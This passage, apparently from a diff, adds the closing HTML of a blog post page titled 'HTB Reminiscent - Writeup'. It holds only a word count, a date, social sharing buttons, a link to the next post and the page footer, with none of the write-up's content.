+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1771 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-04-04 20:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%20Reminiscent%20-%20Writeup&amp;caption=HTB%20Reminiscent%20-%20Writeup&amp;canonicalUrl=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%20Reminiscent%20-%20Writeup&amp;body=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f&amp;media=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f;description=HTB%20Reminiscent%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f&amp;title=HTB%20Reminiscent%20-%20Writeup&amp;summary=HTB%20Reminiscent%20-%20Writeup&amp;source=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f&amp;resubmit=true&amp;title=HTB%20Reminiscent%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f;title=HTB%20Reminiscent%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%20Reminiscent%20-%20Writeup%20https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f&amp;t=HTB%20Reminiscent%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%20Reminiscent%20-%20Writeup&amp;url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-challenge-reminiscent%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://harshitm98.github.io/posts/htb-machine-horizontall/">
+                    <span class="button__text">HTB Horizontall - Writeup</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js" integrity="sha512-cvPNsXV&#43;ZUxaoTKaQmnqao17N1E947nVTXpcolVz&#43;zpk&#43;HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
+
+
+
+    </body>
+</html>
